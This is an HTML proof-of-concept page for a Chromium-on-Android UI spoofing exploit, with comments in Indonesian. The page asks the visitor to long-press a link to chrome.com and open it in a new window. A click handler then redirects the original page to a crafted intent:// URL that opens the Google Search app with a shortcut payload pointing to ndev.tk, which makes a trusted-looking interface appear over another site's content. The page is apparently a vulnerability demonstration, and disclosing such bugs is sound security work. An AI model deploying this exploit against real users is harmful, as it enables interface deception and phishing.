<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC UI Spoofing & Google Redirect</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f4f4f9;
        }
        h1 {
            color: #333;
        }
        .container {
            margin-top: 30px;
        }
        a.button-link {
            display: inline-block;
            margin: 15px;
            padding: 14px 28px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 6px;
            text-decoration: none;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            transition: background 0.2s;
        }
        a.button-link:hover {
            background-color: #1557b0;
        }
    </style>
</head>
<body>

    <h1>Chromium Android UI Spoofing PoC</h1>
    <p>Silakan long-press tautan di bawah dan pilih "Open in new window":</p>

    <div class="container">
        <!-- Tautan: Panel atas akan membuka chrome.com karena href diset ke https://www.chrome.com -->
        <div>
            <a href="https://www.chrome.com" 
               class="button-link" 
               id="spoofLink"
               target="_blank" 
               rel="noopener noreferrer">
                Open New Window (Chrome Context)
            </a>
        </div>
    </div>

    <script>
        document.getElementById('spoofLink').addEventListener('click', function(e) {
            // Panel Bawah (halaman ini) akan merespons klik dengan melakukan redirect 
            // ke URL Google Redirect APK setelah jeda singkat (misal 500ms)
            setTimeout(function() {
                window.location.href = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
            }, 500);
        });
    </script>

</body>
</html>
